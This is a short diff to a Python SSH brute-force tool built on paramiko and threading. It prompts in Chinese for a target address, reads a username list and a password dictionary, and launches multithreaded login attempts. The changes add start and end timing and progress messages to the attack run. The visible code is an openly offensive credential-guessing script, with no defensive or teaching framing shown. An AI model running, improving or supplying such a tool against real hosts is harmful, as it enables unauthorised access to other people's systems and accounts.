@@ -1,6 +1,6 @@
 import paramiko
 import threading
-
+import time
 threads = []  # 线程池
 thread_max = threading.BoundedSemaphore(1000000)
 
@@ -34,9 +34,14 @@ def multi_ssh(tempuser, temppasswd, target):  # 多线程
 
 def begin():
     host = input(' 请输入需要ssh爆破的地址:')
+    timestart=time.time()
+    print("--------开始进行ssh爆破,这可能会花费一些时间,请耐心等待----------")
     tempuser = open('用户名.txt', 'r')
     temppasswd = open('密码库.txt', 'r')
     multi_ssh(tempuser, temppasswd, host)
+    timeend = time.time()
+    print("------------耗时{0:.5f}秒，ssh爆破功能完成------------".format(timeend - timestart))
+
 
 
 
